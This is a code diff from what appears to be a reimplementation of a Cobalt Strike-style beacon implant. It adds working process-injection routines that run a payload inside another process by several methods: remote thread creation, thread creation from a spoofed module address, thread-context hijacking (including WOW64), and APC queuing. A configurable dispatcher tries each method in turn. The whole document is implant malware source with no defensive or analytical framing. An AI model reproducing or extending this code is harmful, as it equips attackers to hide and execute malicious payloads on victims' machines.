@@ -102,8 +102,8 @@ typedef struct _INJECTION
 	DWORD pid;
 	HANDLE process;
 	BOOL isX64;
-	BOOL isEmulating;
-	BOOL isX86NativeOrEmulated;
+	BOOL isProcessX64;
+	BOOL isSameArchAsHostSystem;
 	BOOL isSamePid;
 	BOOL isTemporary;
 	HANDLE thread;
@@ -134,7 +134,7 @@ BOOL IsWow64ProcessEx(HANDLE hProcess)
 	return _IsWow64Process(hProcess, &Wow64Process) && Wow64Process;
 }
 
-BOOL IsEmulating(HANDLE hProcess)
+BOOL IsProcess64Bit(HANDLE hProcess)
 {
 	if (!IS_X64() && !IsWow64ProcessEx(GetCurrentProcess()))
 		return FALSE;
@@ -358,7 +358,217 @@ BOOL ExecuteViaNtQueueApcThread(INJECTION* injection, LPVOID lpStartAddress, LPV
 	return FALSE;
 }
 
+#define METHOD_CREATE_THREAD 1
+#define METHOD_SET_THREAD_CONTEXT 2
+#define METHOD_CREATE_REMOTE_THREAD 3
+#define METHOD_RTL_CREATE_USER_THREAD 4
+#define METHOD_NT_QUEUE_APC_THREAD 5
+#define METHOD_CREATE_THREAD_S 6
+#define METHOD_CREATE_REMOTE_THREAD_S 7
+#define METHOD_NT_QUEUE_APC_THREAD_S 8
 
+BOOL ExecuteViaCreateRemoteThread_s(DWORD option, HANDLE hProcess, LPVOID lpAddress, LPVOID lpParameter, LPCSTR lpModuleName, LPCSTR lpProcName, DWORD ordinal)
+{
+	HANDLE hModule = GetModuleHandleA(lpModuleName);
+	BYTE* processAddress = (BYTE*)GetProcAddress(hModule, lpProcName);
+	if (!processAddress)
+		return FALSE;
+
+	BYTE* finalAddress = processAddress + ordinal;
+	HANDLE hThread;
+	if (option == METHOD_CREATE_REMOTE_THREAD_S)
+	{
+		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)finalAddress, lpParameter, CREATE_SUSPENDED, NULL);
+	} else if (option == METHOD_CREATE_THREAD_S)
+	{
+		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)finalAddress, lpParameter, CREATE_SUSPENDED, NULL);
+	} else
+	{
+		return FALSE;
+	}
+
+	if (!hThread)
+		return FALSE;
+
+	CONTEXT context;
+	context.ContextFlags = CONTEXT_FULL;
+
+	if (!GetThreadContext(hThread, &context))
+		return FALSE;
+
+#if IS_X64()
+	context.Rcx = (DWORD64)lpAddress;
+#else
+	context.Eax = (DWORD)lpAddress;
+#endif
+
+	if (!SetThreadContext(hThread, &context))
+		return FALSE;
+
+	return ResumeThread(hThread) != -1;
+}
+
+BOOL ExecuteViaSetThreadContext_x64(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter)
+{
+	CONTEXT context;
+	context.ContextFlags = CONTEXT_INTEGER;
+
+	if (!GetThreadContext(hThread, &context))
+		return FALSE;
+
+	context.Rcx = (DWORD64)lpStartAddress;
+	context.Rdx = (DWORD64)lpParameter;
+
+	if (!SetThreadContext(hThread, &context))
+		return FALSE;
+
+	return ResumeThread(hThread) != -1;
+}
+
+BOOL ExecuteViaSetThreadContext_x64_x86EmulationMode(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter)
+{
+	WOW64_CONTEXT context;
+	context.ContextFlags = CONTEXT_INTEGER;
+
+	if (!Wow64GetThreadContext(hThread, &context))
+		return FALSE;
+
+	context.Eax = (DWORD)lpStartAddress;
+
+	if (!Wow64SetThreadContext(hThread, &context))
+		return FALSE;
+
+	return ResumeThread(hThread) != -1;
+}
+
+
+BOOL ExecuteViaSetThreadContext(INJECTION* injection, CHAR* lpStartAddress, LPVOID lpParameter)
+{
+	HANDLE hThread = injection->thread;
+
+#if IS_X64()		
+	if (!injection->isProcessX64)
+	{
+		WOW64_CONTEXT context;
+		context.ContextFlags = CONTEXT_INTEGER;
+
+		if (!Wow64GetThreadContext(hThread, &context))
+			return FALSE;
+
+		context.Eax = (DWORD)lpStartAddress;
+
+		if (!Wow64SetThreadContext(hThread, &context))
+			return FALSE;
+	}
+	else
+#endif
+	{
+		CONTEXT context;
+		context.ContextFlags = CONTEXT_INTEGER;
+
+		if (!GetThreadContext(hThread, &context))
+			return FALSE;
+
+#if IS_X64()
+		context.Rcx = (DWORD64)lpStartAddress;
+		context.Rdx = (DWORD64)lpParameter;
+#else
+		context.Eax = (DWORD)lpStartAddress;
+#endif
+
+		if (!SetThreadContext(hThread, &context))
+			return FALSE;
+	}
+
+	return ResumeThread(hThread) != -1;
+}
+
+BOOL ExecuteViaCreateThread(INJECTION* injection, CHAR* lpStartAddress, LPVOID lpParameter)
+{
+	return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL;
+}
+
+BOOL ExecuteInjection(INJECTION* injection, CHAR* lpStartAddress, DWORD offset, LPVOID lpParameter)
+{
+	datap parser;
+	BeaconDataParse(&parser, S_PROCINJ_EXECUTE, 128);
+
+	SHORT ordinal; CHAR* lpModuleName; CHAR* lpProcName;
+	while(char method = BeaconDataByte(&parser))
+	{
+		switch(method)
+		{
+			case METHOD_CREATE_REMOTE_THREAD:
+				if (ExecuteViaCreateRemoteThread(injection->process, lpStartAddress + offset, lpParameter))
+					return TRUE;
+
+				break;
+			case METHOD_RTL_CREATE_USER_THREAD:
+				if (ExecuteViaRtlCreateUserThread(injection->process, lpStartAddress + offset, lpParameter))
+					return TRUE;
+
+				break;
+			case METHOD_NT_QUEUE_APC_THREAD_S:
+				if (!injection->isTemporary || !injection->isSameArchAsHostSystem)
+					continue;
+
+				if (ExecuteViaNtQueueApcThread_s(injection, lpStartAddress + offset, lpParameter))
+					return TRUE;
+
+				break;
+			case METHOD_CREATE_REMOTE_THREAD_S:
+				ordinal = BeaconDataShort(&parser);
+				lpModuleName = BeaconDataStringPointer(&parser);
+				lpProcName = BeaconDataStringPointer(&parser);
+
+				if (!injection->isSameArchAsHostSystem)
+					continue;
+
+				if (ExecuteViaCreateRemoteThread_s(METHOD_CREATE_REMOTE_THREAD_S, injection->process, lpStartAddress + offset, lpParameter, lpModuleName, lpProcName, ordinal))
+					return TRUE;
+
+				break;
+			case METHOD_CREATE_THREAD_S:
+				ordinal = BeaconDataShort(&parser);
+				lpModuleName = BeaconDataStringPointer(&parser);
+				lpProcName = BeaconDataStringPointer(&parser);
+
+				if (!injection->isSamePid)
+					continue;
+
+				if (ExecuteViaCreateRemoteThread_s(METHOD_CREATE_THREAD_S, injection->process, lpStartAddress + offset, lpParameter, lpModuleName, lpProcName, ordinal))
+					return TRUE;
+
+				break;
+			case METHOD_NT_QUEUE_APC_THREAD:
+				if(injection->isSamePid || !injection->isSameArchAsHostSystem || injection->isTemporary)
+					continue;
+
+				if (ExecuteViaNtQueueApcThread(injection, lpStartAddress + offset, lpParameter))
+					return TRUE;
+
+				break;
+			case METHOD_SET_THREAD_CONTEXT:
+				if (!injection->isTemporary)
+					continue;
+
+				if (ExecuteViaSetThreadContext(injection, lpStartAddress + offset, lpParameter))
+					return TRUE;
+
+				break;
+			case METHOD_CREATE_THREAD:
+				if (!injection->isSamePid)
+					continue;
+
+				if (ExecuteViaCreateThread(injection, lpStartAddress + offset, lpParameter))
+					return TRUE;
+
+				break;
+			default:
+				return FALSE;
+		}
+	}
+}
 
 void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset, char* parameter)
 {
@@ -383,8 +593,8 @@ void BeaconInjectProcessInternal(PROCESS_INFORMATION* processInfo, HANDLE hProce
 	injection.pid = pid;
 	injection.process = hProcess;
 	injection.isX64 = IS_X64();
-	injection.isEmulating = IsEmulating(hProcess);
-	injection.isX86NativeOrEmulated = injection.isEmulating == IS_X64();
+	injection.isProcessX64 = IsProcess64Bit(hProcess);
+	injection.isSameArchAsHostSystem = injection.isProcessX64 == IS_X64();
 	injection.isSamePid = pid == GetCurrentProcessId();
 	injection.isTemporary = processInfo != NULL;
 	injection.thread = injection.isTemporary ? processInfo->hThread : NULL;
@@ -392,7 +602,7 @@ void BeaconInjectProcessInternal(PROCESS_INFORMATION* processInfo, HANDLE hProce
 	PAYLOAD* maskedPayload = (PAYLOAD*)payload;
 	if (pLen >= REFLECTIVE_LOADER_SIZE && maskedPayload->mzSignature == IMAGE_DOS_SIGNATURE && maskedPayload->smartInjectMagic == 0xF4F4F4F4)
 	{
-		if (injection.isX86NativeOrEmulated)
+		if (injection.isSameArchAsHostSystem)
 		{
 			maskedPayload->pGetProcAddress = GetProcAddress;
 			maskedPayload->pLoadLibraryA = LoadLibraryA;
